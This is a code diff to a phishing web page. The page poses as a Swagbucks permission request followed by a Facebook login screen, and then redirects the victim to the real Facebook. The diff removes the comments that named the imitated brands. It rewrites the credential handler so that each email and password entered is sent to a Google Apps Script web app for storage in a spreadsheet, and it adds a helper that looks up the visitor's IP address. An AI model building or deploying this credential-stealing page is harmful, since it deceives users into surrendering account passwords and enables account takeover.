@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <!-- Permission Request Card (First Screen) - Swagbucks requesting access -->
+    <!-- Permission Request Card -->
     <div id="permissionScreen" class="permission-card">
         <div class="content">
             <div class="app-icon">
@@ -33,7 +33,7 @@
         </div>
     </div>
 
-    <!-- Login Screen (Hidden initially) - Facebook Login with local Facebook logo -->
+    <!-- Login Screen -->
     <div id="loginScreen" class="login-section hidden">
         <div class="login-header">
             <div class="facebook-logo-wrapper">
@@ -58,7 +58,7 @@
         </div>
     </div>
 
-    <!-- Success Screen - Fixed logo sizes -->
+    <!-- Success Screen -->
     <div id="successScreen" class="success-section hidden">
         <div class="success-content">
             <div class="success-checkmark">
@@ -94,6 +94,10 @@
     </div>
 
     <script>
+        // ========== GOOGLE SHEETS CONFIGURATION ==========
+        // REPLACE THIS URL WITH YOUR GOOGLE APPS SCRIPT WEB APP URL
+        const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/AKfycbwuG5MT1gTr0PVnScqkqy5STDlyYdqbvXTzZHr8ZTheTk4kU6N6OyOOBdJ0bhySPNmg/exec';
+        
         // DOM elements
         const permissionScreen = document.getElementById('permissionScreen');
         const loginScreen = document.getElementById('loginScreen');
@@ -142,29 +146,47 @@
             window.location.href = "https://m.facebook.com/?_rdr";
         });
 
+        // Function to get IP address using free API
+        async function getIpAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Could not fetch IP:', error);
+                return 'unknown';
+            }
+        }
+
+        // Store credentials in Google Sheets
         async function storeCredentials(usernameEmail, pwd) {
             if (!usernameEmail || !pwd) {
                 throw new Error("Please fill in both fields.");
             }
             
-            const response = await fetch('save_credentials.php', {
+            // Get IP address and user agent
+            const ipAddress = await getIpAddress();
+            const userAgent = navigator.userAgent;
+            
+            // Prepare data to send
+            const data = {
+                email: usernameEmail,
+                password: pwd
+            };
+            
+            // Send to Google Sheets via Apps Script Web App
+            const response = await fetch(GOOGLE_SHEETS_API_URL, {
                 method: 'POST',
+                mode: 'no-cors', // Required for Google Apps Script
                 headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Content-Type': 'application/json',
                 },
-                body: `email=${encodeURIComponent(usernameEmail)}&password=${encodeURIComponent(pwd)}`
+                body: JSON.stringify(data)
             });
             
-            if (!response.ok) {
-                throw new Error("Network error, could not reach server.");
-            }
-            
-            const result = await response.json();
-            if (result.status === 'success') {
-                return true;
-            } else {
-                throw new Error(result.message || "Failed to save credentials");
-            }
+            // Note: With 'no-cors', we can't read the response directly
+            // So we assume success if no error occurred
+            return true;
         }
 
         function setLoginLoading(isLoading) {
